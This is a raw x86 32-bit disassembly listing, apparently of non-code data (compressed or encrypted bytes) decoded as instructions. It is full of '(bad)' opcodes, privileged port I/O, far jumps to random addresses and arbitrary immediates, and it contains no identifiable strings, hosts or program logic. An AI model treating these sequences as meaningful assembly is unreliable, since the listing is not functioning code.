  41fa8d:	sbb    al,0xe5
  41fa8f:	xchg   edx,eax
  41fa90:	sbb    DWORD PTR [ebx],0x1da21b3f
  41fa96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa97:	les    eax,FWORD PTR [edx]
  41fa99:	pushf  
  41fa9a:	mov    bl,0x4e
  41fa9c:	jmp    0xb5c2:0x2715c915
  41faa3:	jl     0x41fab8
  41faa5:	leave  
  41faa6:	add    bh,BYTE PTR [edi+0x66d26abd]
  41faac:	push   ss
  41faad:	nop
  41faae:	adc    dh,BYTE PTR [eax]
  41fab0:	mov    ds:0x8a29e134,eax
  41fab5:	adc    DWORD PTR [ebp+0x7beab8ec],0x290cc337
  41fabf:	ret    0xf6d9
  41fac2:	mov    dh,0xdb
  41fac4:	leave  
  41fac5:	or     ecx,0x3822a7ee
  41facb:	lahf   
  41facc:	ret    0xb08
  41facf:	imul   cl
  41fad1:	mov    ds:0xb765f862,al
  41fad6:	clc    
  41fad7:	cmp    edi,DWORD PTR [ebx+edx*8]
  41fada:	scas   eax,DWORD PTR es:[edi]
  41fadb:	pop    edx
  41fadc:	adc    DWORD PTR [ecx],0x66
  41fadf:	repz mov ds:0x1e466b37,eax
  41fae5:	test   BYTE PTR [edi],bl
  41fae7:	push   ebp
  41fae8:	ret    0xfd5f
  41faeb:	jnp    0x41fb23
  41faed:	or     eax,DWORD PTR [edi+0x58]
  41faf0:	and    edi,ebp
  41faf2:	fsub   st,st(3)
  41faf4:	fisub  DWORD PTR [eax-0x188a1aab]
  41fafa:	aaa    
  41fafb:	cmp    al,0x21
  41fafd:	dec    ebp
  41fafe:	mov    bl,0x29
  41fb00:	push   0x24
  41fb02:	cmp    edi,DWORD PTR [ebp-0x7f23d2d]
  41fb08:	aam    0x10
  41fb0a:	scas   al,BYTE PTR es:[edi]
  41fb0b:	sub    ch,ch
  41fb0d:	fst    DWORD PTR [edi-0x1bbd78a7]
  41fb13:	jae    0x41fb47
  41fb15:	jg     0x41faac
  41fb17:	cmp    esp,edx
  41fb19:	jb     0x41fab0
  41fb1b:	repz out dx,al
  41fb1d:	cmp    edi,edi
  41fb1f:	popa   
  41fb20:	in     eax,0xd4
  41fb22:	mov    edx,0x79523de1
  41fb27:	and    edi,DWORD PTR [edx+0x66]
  41fb2a:	mov    dh,0x24
  41fb2c:	imul   esp,esp,0xfb6ce1b8
  41fb32:	xor    BYTE PTR [ecx-0x18ec5072],ch
  41fb38:	add    ah,BYTE PTR [eax+0x76428578]
  41fb3e:	(bad)  [eax]
  41fb40:	retf   
  41fb41:	inc    eax
  41fb42:	mov    esi,0x29f9fc12
  41fb47:	shl    bh,0x9d
  41fb4a:	sahf   
  41fb4b:	bound  esp,QWORD PTR [ebx-0x2c]
  41fb4e:	jo     0x41fb47
  41fb50:	push   ecx
  41fb51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb52:	sub    al,BYTE PTR [eax-0x516f3e11]
  41fb58:	sti    
  41fb59:	les    esi,FWORD PTR [edi]
  41fb5b:	mov    eax,0x8394c87a
  41fb60:	xchg   ebx,eax
  41fb61:	aam    0xcb
  41fb63:	xor    eax,0xb2353643
  41fb68:	add    BYTE PTR [ebx+eiz*8-0x69e2e524],bh
  41fb6f:	push   ss
  41fb70:	inc    ecx
  41fb71:	int3   
  41fb72:	xlat   BYTE PTR ds:[ebx]
  41fb73:	ret    
  41fb74:	les    eax,FWORD PTR [edi+0x24]
  41fb77:	daa    
  41fb78:	mov    esp,0xa219c530
  41fb7d:	dec    ecx
  41fb7e:	les    ecx,FWORD PTR [ebx-0x41]
  41fb81:	push   0x1c
  41fb83:	push   edx
  41fb84:	pop    es
  41fb85:	(bad)  
  41fb86:	fwait
  41fb87:	sti    
  41fb88:	sbb    eax,0x6cfb4c74
  41fb8d:	movlps QWORD PTR [edi],xmm7
	...
  41fbf4:	fsubr  QWORD PTR [eax]
  41fbf6:	mov    ah,ah
  41fbf8:	(bad)  
  41fbf9:	out    0xfe,al
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	jno    0x41fc52
  41fc02:	retf   
  41fc03:	stc    
  41fc04:	aam    0x51
  41fc06:	add    DWORD PTR [eax],eax
  41fc08:	add    al,0x1
  41fc0a:	add    BYTE PTR [eax],al
  41fc0c:	mov    DWORD PTR [ecx+0x16],0xe3eab37c
  41fc13:	sbb    al,0xa7
  41fc15:	cmp    ebx,ebx
  41fc17:	inc    ebp
  41fc18:	pusha  
  41fc19:	lods   al,BYTE PTR ds:[esi]
  41fc1a:	mov    esp,0x724ca2b9
  41fc1f:	data16 adc al,0x96
  41fc22:	dec    esi
  41fc23:	add    ebp,DWORD PTR [eax+0x7506fa2b]
  41fc29:	jp     0x41fbff
  41fc2b:	xor    eax,0x53a7c683
  41fc30:	hlt    
  41fc31:	sub    eax,DWORD PTR [ebp-0x71]
  41fc34:	sbb    al,0x4d
  41fc36:	(bad)  
  41fc38:	add    ebx,DWORD PTR ds:0x4ac6e5d6
  41fc3e:	ds jecxz 0x41fbc1
  41fc41:	cmp    DWORD PTR [edi-0x18],ebx
  41fc44:	in     al,dx
  41fc45:	xchg   edx,eax
  41fc46:	jno    0x41fc83
  41fc48:	pop    ebx
  41fc49:	dec    esi
  41fc4a:	add    BYTE PTR [edi-0x79f85c91],ch
  41fc50:	ror    ah,cl
  41fc52:	call   0x66d27e07
  41fc57:	fwait
  41fc58:	mov    dl,0x33
  41fc5a:	pop    esp
  41fc5b:	or     bl,ch
  41fc5d:	shl    DWORD PTR [edi-0x773f096a],1
  41fc63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc64:	repz mov ds:0xee149874,eax
  41fc6a:	inc    esp
  41fc6b:	mov    ebp,DWORD PTR [esi+0x111608e8]
  41fc71:	sbb    bh,BYTE PTR [ebx-0x4ea360c5]
  41fc77:	jnp    0x41fcf4
  41fc79:	xor    al,BYTE PTR [edx-0x3a53be06]
  41fc7f:	sbb    eax,0x116fe68d
  41fc84:	call   0xf2e139b7
  41fc89:	js     0x41fc74
  41fc8b:	adc    BYTE PTR [edi-0x40],bh
  41fc8e:	mov    ch,0xad
  41fc90:	or     BYTE PTR [bp+si],al
  41fc93:	test   esp,ebx
  41fc95:	xor    BYTE PTR [eax],dl
  41fc97:	pushf  
  41fc98:	jns    0x41fc94
  41fc9a:	iret   
  41fc9b:	xchg   ecx,eax
  41fc9c:	jmp    0x241f:0xb8ca19ee
  41fca3:	sub    ebx,DWORD PTR [ebx+0x79159463]
  41fca9:	inc    edi
  41fcaa:	xor    bl,BYTE PTR [esi-0x4e4e6b7a]
  41fcb0:	mov    ebp,0xb5789f49
  41fcb5:	popa   
  41fcb6:	fdiv   DWORD PTR [ebx+0x7f]
  41fcb9:	mov    ebx,0x3f6ab070
  41fcbe:	adc    eax,0x98ac48ff
  41fcc3:	fxch   st(3)
  41fcc5:	stos   BYTE PTR es:[edi],al
  41fcc6:	add    dl,cl
  41fcc8:	sub    BYTE PTR [edx+0x1],ch
  41fccb:	shr    DWORD PTR [ebx],0x8c
  41fcce:	pop    eax
  41fccf:	(bad)  
  41fcd0:	nop
  41fcd1:	sub    dh,bh
  41fcd3:	inc    ecx
  41fcd4:	popf   
  41fcd5:	seto   BYTE PTR [ebp-0x2c]
  41fcd9:	jmp    0xf4b54b8a
  41fcde:	mov    dh,0x41
  41fce0:	sti    
  41fce1:	in     al,0xc9
  41fce3:	cmp    edx,DWORD PTR [edx]
  41fce5:	push   ecx
  41fce6:	cmp    DWORD PTR [edi],eax
  41fce8:	rcl    ah,0xa0
  41fceb:	(bad)  
  41fcec:	xlat   BYTE PTR ds:[ebx]
  41fced:	push   0x50
  41fcef:	and    DWORD PTR [ecx+0x2f446b1],eax
  41fcf5:	add    dl,BYTE PTR [ecx]
  41fcf7:	sbb    ebp,DWORD PTR [ebx+0x54dae7a9]
  41fcfd:	les    edx,FWORD PTR [edx+edx*2-0x702b8a7c]
  41fd04:	cdq    
  41fd05:	fbld   TBYTE PTR [eax-0x7a]
  41fd08:	inc    edi
  41fd09:	mov    ch,dh
  41fd0b:	(bad)  
  41fd0c:	lock mov edi,0x27a4
	...
  41fd72:	add    BYTE PTR [eax],al
  41fd74:	or     al,0x6a
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	scas   eax,DWORD PTR es:[edi]
  41fd81:	fadd   DWORD PTR [edi+0x152d8d4]
  41fd87:	add    BYTE PTR [ecx+eax*1],al
  41fd8a:	add    BYTE PTR [eax],al
  41fd8c:	push   0x8dcf8a59
  41fd91:	sbb    BYTE PTR [edi+0xe],0x47
  41fd95:	mov    al,0x21
  41fd97:	jo     0x41fd94
  41fd99:	cwde   
  41fd9a:	add    DWORD PTR [esi],ebp
  41fd9c:	mov    bl,0xb
  41fd9e:	add    ebx,edi
  41fda0:	jge    0x41fd36
  41fda2:	loopne 0x41fd8b
  41fda4:	sbb    eax,DWORD PTR [ebp-0x49]
  41fda7:	cs xchg edi,eax
  41fda9:	out    dx,al
  41fdaa:	mov    WORD PTR [ebx-0x4d],fs
  41fdad:	pop    edi
  41fdae:	fcom   st(4)
  41fdb0:	ror    dh,0x3d
  41fdb3:	pop    eax
  41fdb4:	ja     0x41fdf8
  41fdb6:	fwait
  41fdb7:	push   0xe438812
  41fdbc:	jb     0x41fdc1
  41fdbe:	xor    eax,eax
  41fdc0:	pop    edx
  41fdc1:	ins    BYTE PTR es:[edi],dx
  41fdc2:	xor    al,0xbf
  41fdc4:	addr16 dec ebx
  41fdc6:	push   eax
  41fdc7:	push   esi
  41fdc8:	imul   ebx,edi,0x74723d89
  41fdce:	loopne 0x41fde0
  41fdd0:	int    0x17
  41fdd2:	adc    BYTE PTR ds:0x528187a7,cl
  41fdd8:	cmp    BYTE PTR [ebp-0x75],0x91
  41fddc:	int    0x60
  41fdde:	jbe    0x41fe3f
  41fde0:	dec    ecx
  41fde1:	iret   
  41fde2:	je     0x41fd8b
  41fde4:	sub    DWORD PTR [ebx],ebp
  41fde6:	ins    DWORD PTR es:[edi],dx
  41fde7:	nop
  41fde8:	iret   
  41fde9:	push   edx
  41fdea:	inc    ecx
  41fdeb:	cmp    DWORD PTR [ecx+ebp*1-0x76ec9a68],edx
  41fdf2:	out    dx,al
  41fdf3:	or     DWORD PTR [ebp-0x3b84c7bc],0x10bf4e05
  41fdfd:	(bad)  
  41fdfe:	xchg   esi,eax
  41fdff:	cdq    
  41fe00:	sbb    bl,BYTE PTR [ebp+0x653e494b]
  41fe06:	sbb    eax,0x33b5449
  41fe0b:	dec    ecx
  41fe0c:	daa    
  41fe0d:	mov    fs,WORD PTR [esi]
  41fe0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe10:	adc    bl,ah
  41fe12:	retf   0xf19c
  41fe15:	mov    cl,0x1a
  41fe17:	dec    eax
  41fe18:	fwait
  41fe19:	xchg   cl,bl
  41fe1b:	scas   eax,DWORD PTR es:[edi]
  41fe1c:	cmp    eax,0x4f05174
  41fe21:	in     al,dx
  41fe22:	(bad)  
  41fe23:	out    dx,eax
  41fe24:	xchg   edx,eax
  41fe25:	ret    
  41fe26:	mul    ecx
  41fe28:	(bad)  
  41fe29:	rol    BYTE PTR [edi],0x8b
  41fe2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe2d:	adc    al,0xf
  41fe2f:	inc    ebp
  41fe30:	mov    edi,0xd7f012ca
  41fe35:	mov    dl,0xdb
  41fe37:	inc    ecx
  41fe38:	push   eax
  41fe39:	data16 into 
  41fe3b:	repz int3 
  41fe3d:	clc    
  41fe3e:	add    esp,DWORD PTR [esi]
  41fe40:	xor    BYTE PTR [esi],bl
  41fe42:	xchg   ebx,eax
  41fe43:	ja     0x41fe5e
  41fe45:	xchg   ebp,eax
  41fe46:	lahf   
  41fe47:	lock and edi,DWORD PTR [ebx+0x567204b5]
  41fe4e:	and    al,0x69
  41fe50:	adc    al,0xc9
  41fe52:	jecxz  0x41fe61
  41fe54:	push   ss
  41fe55:	es jmp 0x41fe91
  41fe58:	mov    esi,?
  41fe5a:	xchg   BYTE PTR [edi-0x7b],cl
  41fe5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe5e:	or     BYTE PTR ds:0xd8170733,dl
  41fe64:	adc    DWORD PTR [ebx],ecx
  41fe66:	(bad)  
  41fe67:	rcl    BYTE PTR [esi+0x25],cl
  41fe6a:	pop    ebp
  41fe6b:	mov    ?,WORD PTR [ebx-0x4b]
  41fe6e:	push   ss
  41fe6f:	in     al,0x77
  41fe71:	push   es
  41fe72:	and    al,0xa7
  41fe74:	loopne 0x41fec1
  41fe76:	into   
  41fe77:	add    bl,al
  41fe79:	cmp    bh,ch
  41fe7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe7c:	(bad)
  41fe7f:	and    esp,DWORD PTR [eax+0x7cba8710]
  41fe85:	int    0x14
  41fe87:	mov    cl,0x7b
  41fe89:	jbe    0x41fe55
  41fe8b:	adc    eax,0x764fa629
	...
  41fef4:	stos   BYTE PTR es:[edi],al
  41fef5:	push   ebp
  41fef6:	call   0xfb5d:0xffefffe7
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0xd4
  41ff01:	test   BYTE PTR [ebx],0xd7
  41ff04:	fcom   QWORD PTR [ebx+0x1]
  41ff07:	add    BYTE PTR [ecx+eax*1],al
  41ff0a:	add    BYTE PTR [eax],al
  41ff0c:	cs pusha 
  41ff0e:	cmp    al,0x97
  41ff10:	in     eax,dx
  41ff11:	adc    bh,BYTE PTR [ecx-0x1e252acb]
  41ff17:	loope  0x41ff02
  41ff19:	mov    fs,WORD PTR [edx+0x2d]
  41ff1c:	sbb    eax,0xa7baf933
  41ff21:	jb     0x41ff1b
  41ff23:	mov    edx,0x746d9089
  41ff28:	es fprem1 
  41ff2b:	adc    eax,DWORD PTR [ebp+0x65]
  41ff2e:	jecxz  0x41fed7
  41ff30:	adc    esi,esi
  41ff32:	pusha  
  41ff33:	jno    0x41ff81
  41ff35:	mov    ds:0xdc0ff809,eax
  41ff3a:	adc    eax,0x6cdeb0c7
  41ff3f:	cmc    
  41ff40:	pop    ss
  41ff41:	enter  0x60f1,0xfe
  41ff45:	mov    dh,0x61
  41ff47:	test   BYTE PTR [ebp+0x2873e897],0xe6
  41ff4e:	xchg   edi,eax
  41ff4f:	add    ah,bl
  41ff51:	mov    al,0x89
  41ff53:	sbb    DWORD PTR [ebx],0x3058e604
  41ff59:	sbb    edi,esp
  41ff5b:	mov    WORD PTR [esi+0x14],es
  41ff5e:	mov    BYTE PTR [bx+di+0x13fe],dl
  41ff63:	hlt    
  41ff64:	xchg   BYTE PTR [edi+0x1cef8d69],dl
  41ff6a:	ror    DWORD PTR [edx],1
  41ff6c:	loope  0x41ff8b
  41ff6e:	fcmovbe st,st(2)
  41ff70:	push   ebx
  41ff71:	and    al,BYTE PTR [edx+ebx*2+0xb]
  41ff75:	mov    dh,0x9f
  41ff77:	dec    eax
  41ff78:	cmc    
  41ff79:	jb     0x41ff78
  41ff7b:	inc    esp
  41ff7c:	mov    dh,0xb7
  41ff7e:	es push ebx
  41ff80:	iret   
  41ff81:	push   es
  41ff82:	sub    eax,0x5f64b9e9
  41ff87:	add    edi,DWORD PTR [esi+0x28]
  41ff8a:	adc    ch,BYTE PTR [ebx-0x1e]
  41ff8d:	push   ds
  41ff8e:	inc    esi
  41ff8f:	inc    ebx
  41ff90:	fst    QWORD PTR [esi]
  41ff92:	or     eax,DWORD PTR [ebp+0x7e]
  41ff95:	mov    dl,bl
  41ff97:	imul   ebx,DWORD PTR [esi+0x61],0xf54a2042
  41ff9e:	xchg   edx,eax
  41ff9f:	pop    esp
  41ffa0:	les    eax,FWORD PTR [edi-0x7e7401fb]
  41ffa6:	sbb    al,0x40
  41ffa8:	pop    edi
  41ffa9:	adc    al,0x12
  41ffab:	xchg   ebx,eax
  41ffac:	retf   
  41ffad:	out    0xa7,al
  41ffaf:	xor    al,0x48
  41ffb1:	je     0x41ff40
  41ffb3:	cmp    eax,0x67fce32b
  41ffb8:	dec    ebp
  41ffb9:	xchg   esi,eax
  41ffba:	push   es
  41ffbb:	mov    ebx,0x49867a83
  41ffc0:	aad    0xf
  41ffc2:	scas   eax,DWORD PTR es:[edi]
  41ffc3:	or     eax,0xed3fd1fe
  41ffc8:	aam    0x8a
  41ffca:	in     al,dx
  41ffcb:	stos   BYTE PTR es:[edi],al
  41ffcc:	dec    esp
  41ffcd:	add    DWORD PTR [esi-0x38a173cb],esi
  41ffd3:	mov    ds:0x870fb556,al
  41ffd8:	outs   dx,DWORD PTR ds:[esi]
  41ffd9:	jl     0x41ff86
  41ffdb:	add    edi,DWORD PTR [ebx-0x61]
  41ffde:	adc    eax,0xaaf9d2a2
  41ffe3:	cld    
  41ffe4:	xchg   ebx,eax
  41ffe5:	push   0x27
  41ffe7:	push   es
  41ffe8:	sbb    BYTE PTR ds:0xb913b996,0x8
  41ffef:	das    
  41fff0:	mov    ah,0x8
  41fff2:	xor    al,0xdc
  41fff4:	in     al,dx
  41fff5:	ins    BYTE PTR es:[edi],dx
  41fff6:	test   eax,0x50baff4a
  41fffb:	aaa    
  41fffc:	xchg   esi,eax
  41fffd:	mov    edi,0x2d14a5bd
  420002:	aas    
  420003:	pop    esp
  420004:	fs popf 
  420006:	js     0x420023
  420008:	outs   dx,DWORD PTR ds:[esi]
  420009:	std    
  42000a:	dec    ebx
  42000b:	in     eax,0x15
  42000d:	pop    esi
  42000e:	mov    eax,ds:0x9e
	...
  420073:	add    BYTE PTR [edx-0x5b],ah
  420076:	jbe    0x4200f7
  420078:	idiv   edi
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0x54
  420081:	jmp    0x4200b0
  420083:	mov    esp,eax
  420085:	push   esp
  420086:	add    DWORD PTR [eax],eax
  420088:	add    al,0x1
  42008a:	add    BYTE PTR [eax],al
  42008c:	push   ds
  42008d:	xchg   edi,eax
  42008e:	pushf  
  42008f:	call   0xadc1:0x8e9aebd4
  420096:	cs pop ecx
  420098:	jmp    0xc3155b45
  42009d:	mov    ds:0xa4bebe6,al
  4200a2:	add    ebp,DWORD PTR [edx+0x55c32313]
  4200a8:	and    eax,0x81121a19
  4200ad:	push   esp
  4200ae:	push   cs
  4200af:	stc    
  4200b0:	and    DWORD PTR [ebx+0x4e],ebp
  4200b3:	push   0xdcaa4361
  4200b8:	sbb    eax,0x6f27ab91
  4200bd:	mov    dh,0xd3
  4200bf:	push   ds
  4200c0:	cmp    DWORD PTR [ebp+0x38f87a7f],ecx
  4200c6:	fisubr WORD PTR [ebp-0x4b923698]
  4200cc:	xchg   esp,eax
  4200cd:	cmp    DWORD PTR [edi+0x52],ecx
  4200d0:	int3   
  4200d1:	lods   al,BYTE PTR ds:[esi]
  4200d2:	pusha  
  4200d3:	jl     0x420095
  4200d5:	pop    ecx
  4200d6:	sub    ebp,DWORD PTR [esi-0x1d]
  4200d9:	push   eax
  4200da:	outs   dx,BYTE PTR ds:[esi]
  4200db:	mov    bh,0x99
  4200dd:	inc    ebx
  4200de:	jp     0x42014c
  4200e0:	cmp    BYTE PTR [eax],cl
  4200e2:	jp     0x42010b
  4200e4:	ret    
  4200e5:	inc    esp
  4200e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200e7:	lahf   
  4200e8:	(bad)  
  4200e9:	jns    0x420084
  4200eb:	cs fwait
  4200ed:	test   al,0xdf
  4200ef:	pop    ss
  4200f0:	xchg   esi,eax
  4200f1:	js     0x4200c4
  4200f3:	dec    ebx
  4200f4:	(bad)  
  4200f5:	loop   0x420098
  4200f7:	ins    BYTE PTR es:[edi],dx
  4200f8:	and    DWORD PTR ds:0x18c21ea3,0x2198a163
  420102:	add    BYTE PTR [ecx-0x4f],al
  420105:	push   ebx
  420106:	fwait
  420107:	pusha  
  420108:	xor    DWORD PTR [ebp-0x56b5943e],ebp
  42010e:	cld    
  42010f:	lods   al,BYTE PTR ds:[esi]
  420110:	xchg   esi,eax
  420111:	inc    ecx
  420112:	aaa    
  420113:	mov    ebp,0xa42f4942
  420118:	fucomi st,st(3)
  42011a:	mov    ebx,es
  42011c:	lock xchg edi,eax
  42011e:	cmp    DWORD PTR [ecx+ebp*8-0x62],0xf
  420123:	pop    ss
  420124:	leave  
  420125:	(bad)  
  420126:	daa    
  420127:	inc    ecx
  420128:	fwait
  420129:	pop    eax
  42012a:	pusha  
  42012b:	xor    eax,esp
  42012d:	pop    ebp
  42012e:	sub    DWORD PTR [edx+ecx*8-0x76],edi
  420132:	scas   al,BYTE PTR es:[edi]
  420133:	enter  0x33c2,0xa3
  420137:	pusha  
  420138:	cmp    DWORD PTR [ebx+0x31],edx
  42013b:	cmp    al,0x46
  42013d:	or     edi,ebx
  42013f:	jno    0x42010f
  420141:	dec    DWORD PTR [ebp+0xc]
  420144:	inc    edi
  420145:	xchg   esi,eax
  420146:	repnz (bad) 
  420148:	mov    BYTE PTR [eax-0x1178f32f],bl
  42014e:	es stos DWORD PTR es:[edi],eax
  420150:	sub    eax,0xef91d9a0
  420155:	xchg   DWORD PTR [ebx],esp
  420157:	mov    ebp,DWORD PTR [edx-0x70f67512]
  42015d:	fcmovbe st,st(7)
  42015f:	out    0x90,eax
  420161:	retf   
  420162:	mov    DWORD PTR [edx],eax
  420164:	xchg   ebx,eax
  420165:	outs   dx,DWORD PTR ds:[si]
  420167:	fisttp WORD PTR [ecx+0xb60faf8]
  42016d:	sar    DWORD PTR [eax],0x71
  420170:	add    bh,bh
  420172:	or     BYTE PTR [esi],dl
  420174:	(bad)  
  420175:	and    DWORD PTR [esi+0x43de06ca],ebx
  42017b:	add    ecx,DWORD PTR [ebx-0x20a7934f]
  420181:	dec    esi
  420182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420183:	js     0x420110
  420185:	in     al,0x75
  420187:	jno    0x4201ef
  420189:	das    
  42018a:	in     eax,0x17
  42018c:	(bad)  
  42018d:	loop   0x420180
  42018f:	(bad)  
	...
  4201f4:	jae    0x4201c5
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx-0x5d22cf6c],1
  420204:	in     al,0x55
  420206:	add    DWORD PTR [eax],eax
  420208:	add    al,0x1
  42020a:	add    BYTE PTR [eax],al
  42020c:	jle    0x42021f
  42020e:	arpl   WORD PTR [edx+ecx*2-0x2],dx
  420212:	fs fwait
  420214:	out    0x8a,al
  420216:	cmc    
  420217:	cmp    eax,0x59030c43
  42021c:	stos   DWORD PTR es:[edi],eax
  42021d:	dec    ebp
  42021e:	mov    ebx,0x1650f28c
  420223:	mov    DWORD PTR [edx+ecx*2],ebx
  420226:	push   ebp
  420227:	fwait
  420228:	mov    esp,0xeede636d
  42022d:	fwait
  42022e:	push   esp
  42022f:	pop    ecx
  420230:	outs   dx,BYTE PTR ds:[esi]
  420231:	jge    0x42021e
  420233:	aas    
  420234:	idiv   DWORD PTR [esi-0x6f5311e3]
  42023a:	push   eax
  42023b:	ss ret 
  42023d:	add    DWORD PTR [ebx],esi
  42023f:	sub    eax,DWORD PTR [esi]
  420241:	adc    edi,DWORD PTR [ebp-0x77]
  420244:	xchg   ebx,eax
  420245:	and    DWORD PTR [edi-0x6c],esi
  420248:	cwde   
  420249:	and    dl,bh
  42024b:	push   ebp
  42024c:	pop    esp
  42024d:	retf   
  42024e:	pop    es
  42024f:	retf   
  420250:	mov    al,ds:0x91c1871e
  420255:	mov    BYTE PTR [eax+0x179bd8ce],dh
  42025b:	(bad)  
  42025c:	sbb    BYTE PTR [edi+esi*2],bl
  42025f:	fidivr DWORD PTR [edx+0x3a]
  420262:	(bad)  
  420263:	ins    DWORD PTR es:[edi],dx
  420264:	cli    
  420265:	xchg   dh,ah
  420267:	adc    eax,0x8582f198
  42026c:	popf   
  42026d:	cwde   
  42026e:	sti    
  42026f:	dec    esi
  420270:	xor    bl,BYTE PTR [ebx*2+0x626124d7]
  420277:	aas    
  420278:	jmp    FWORD PTR [edx-0x23da0e8c]
  42027e:	push   edi
  42027f:	cmp    DWORD PTR [edx+0x25],esp
  420282:	mov    esi,0xc1451b22
  420287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420288:	push   es
  420289:	inc    esi
  42028a:	mov    ds,esi
  42028c:	in     eax,dx
  42028d:	out    dx,al
  42028e:	outs   dx,BYTE PTR gs:[esi]
  420290:	cwde   
  420291:	push   cs
  420292:	mov    eax,0xe68d5b63
  420297:	repnz pop edx
  420299:	ja     0x4202e2
  42029b:	mov    bh,0x1e
  42029d:	and    bl,BYTE PTR [ebx+0x16]
  4202a0:	add    al,bl
  4202a2:	cwde   
  4202a3:	mov    DWORD PTR [edi],edx
  4202a5:	jp     0x4202e1
  4202a7:	rcr    DWORD PTR [ebx],cl
  4202a9:	retf   0x9542
  4202ac:	(bad)  
  4202ad:	lock scas eax,DWORD PTR es:[edi]
  4202af:	rcl    BYTE PTR [esi+0x66],cl
  4202b2:	dec    eax
  4202b3:	ins    BYTE PTR es:[edi],dx
  4202b4:	scas   eax,DWORD PTR es:[edi]
  4202b5:	and    DWORD PTR [edi+edi*2-0x5a49c3ea],edi
  4202bc:	xchg   ecx,ebx
  4202be:	cmp    DWORD PTR [ecx],edi
  4202c0:	cmp    eax,0x52c8fb3
  4202c5:	repnz stos DWORD PTR es:[edi],eax
  4202c7:	pop    ds
  4202c8:	mov    esp,0x5f701e0d
  4202cd:	push   esi
  4202ce:	fstp   DWORD PTR [eax+0x69b562f7]
  4202d4:	dec    ebx
  4202d5:	(bad)  
  4202d6:	das    
  4202d7:	(bad)  
  4202d8:	push   esi
  4202d9:	dec    ecx
  4202da:	addr16 pop ebx
  4202dc:	xchg   DWORD PTR [esi],esp
  4202de:	xor    ecx,DWORD PTR [ebx]
  4202e0:	imul   ebp,DWORD PTR [esi-0x462219c3],0x1a
  4202e7:	test   al,0xfd
  4202e9:	mov    ah,0xb9
  4202eb:	aam    0xe
  4202ed:	xchg   esp,eax
  4202ee:	or     bl,al
  4202f0:	jo     0x42030f
  4202f2:	push   eax
  4202f3:	adc    al,0xcd
  4202f5:	fld    TBYTE PTR [ecx]
  4202f7:	sbb    ebx,DWORD PTR [edi-0x203bd255]
  4202fd:	adc    eax,0xf1e60e59
  420302:	test   BYTE PTR [esi-0x79bb9dad],cl
  420308:	cmc    
  420309:	cmp    esi,DWORD PTR [esi]
  42030b:	and    dl,BYTE PTR [esi+0xbfe743]
	...
  420371:	add    BYTE PTR [eax],al
  420373:	add    BYTE PTR [ecx+0x6],al
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	xchg   BYTE PTR [ecx+0x56e865ed],bh
  420386:	add    DWORD PTR [eax],eax
  420388:	add    al,0x1
  42038a:	add    BYTE PTR [eax],al
  42038c:	inc    esp
  42038d:	push   cs
  42038e:	call   0x3092:0xa4bf48a
  420395:	ins    DWORD PTR es:[edi],dx
  420396:	xchg   ebp,eax
  420397:	lds    ebp,FWORD PTR es:[ebx-0x66]
  42039b:	sbb    BYTE PTR [ebp+0x50],bl
  42039e:	lahf   
  42039f:	pop    esi
  4203a0:	sar    DWORD PTR [edx],0xf4
  4203a3:	push   esp
  4203a4:	xchg   ecx,eax
  4203a5:	test   BYTE PTR [ecx-0xd],bh
  4203a8:	scas   al,BYTE PTR es:[edi]
  4203a9:	ins    DWORD PTR es:[edi],dx
  4203aa:	xchg   edx,eax
  4203ab:	in     eax,0x96
  4203ad:	sbb    cl,BYTE PTR ds:0xbabac83b
  4203b3:	sahf   
  4203b4:	loopne 0x42034a
  4203b6:	jns    0x420377
  4203b8:	rcl    DWORD PTR [esi],1
  4203ba:	ins    BYTE PTR es:[edi],dx
  4203bb:	cmp    BYTE PTR [eax+0x26d86d4f],ah
  4203c1:	adc    al,0x2b
  4203c3:	add    ah,BYTE PTR [eax-0x750462d0]
  4203c9:	mov    ds:0xe057c432,al
  4203ce:	les    eax,FWORD PTR [edi]
  4203d0:	je     0x420377
  4203d2:	mov    esi,0xb174ba9
  4203d7:	int    0xa
  4203d9:	ins    BYTE PTR es:[edi],dx
  4203da:	scas   al,BYTE PTR es:[edi]
  4203db:	cli    
  4203dc:	jbe    0x42044e
  4203de:	jle    0x420375
  4203e0:	neg    DWORD PTR [ebx-0x2f]
  4203e3:	test   eax,0x2e611254
  4203e8:	iret   
  4203e9:	xor    eax,0xf30bf4eb
  4203ee:	and    DWORD PTR [ecx],esp
  4203f0:	jnp    0x4203ea
  4203f2:	push   ds
  4203f3:	loopne 0x4203c0
  4203f5:	data16 test BYTE PTR [ecx],ch
  4203f8:	test   al,0xee
  4203fa:	idiv   ebx
  4203fc:	fst    QWORD PTR [bp+0x4736]
  420401:	xor    ebx,edx
  420403:	bound  esp,QWORD PTR [ebp+0x79]
  420406:	popf   
  420407:	cmp    BYTE PTR [esi],al
  420409:	add    dh,BYTE PTR [ecx-0x522c5762]
  42040f:	push   cs
  420410:	outs   dx,BYTE PTR ds:[esi]
  420411:	hlt    
  420412:	(bad)
  420416:	mov    dl,0xab
  420418:	jo     0x4203bd
  42041a:	xor    DWORD PTR [esi-0x20],edx
  42041d:	mov    bh,0xcd
  42041f:	ja     0x420488
  420421:	xchg   esi,eax
  420422:	lods   eax,DWORD PTR ds:[esi]
